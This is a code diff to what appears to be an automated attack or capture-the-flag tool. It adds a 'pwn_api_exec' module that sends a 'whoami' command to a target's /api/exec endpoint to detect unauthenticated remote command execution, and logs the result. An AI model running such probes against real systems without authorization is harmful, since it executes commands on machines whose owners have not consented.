@@ -6,6 +6,7 @@ from typing import Tuple
 import dns.query
 import dns.zone
 import paramiko
+import requests
 from dns.exception import DNSException
 from faker import Faker
 
@@ -133,8 +134,24 @@ def pwn_smtp(url: str, port: int, service: Service, flag_conf: FlagConf,
         return 'Not an open-relay', False, False
 
 
+def pwn_api_exec(url: str, port: int, service: Service, flag_conf: FlagConf,
+                 limit_creds: LimitCreds, context: PostContext) -> Tuple[str, bool, bool]:
+    try:
+        resp = requests.post(f"http://{url}/api/exec", {'command': 'whoami'}, verify=False)
+        if resp.status_code == 200:
+            context['api-exec'] = True
+            context['api-exec-response'] = resp.content
+            logger.info('Found api-exec with user: %s', resp.content)
+            return 'api-exec detected', True, False
+    except Exception:
+        logger.exception('Failure while detecting api exec')
+        return 'Error while detecting', False, False
+    else:
+        return 'No api-exec', False, False
+
 PWN_FUNCS = {
     'ssh': pwn_ssh,
     'dns': pwn_dns,
     'smtp': pwn_smtp,
+    'http': pwn_api_exec,
 }
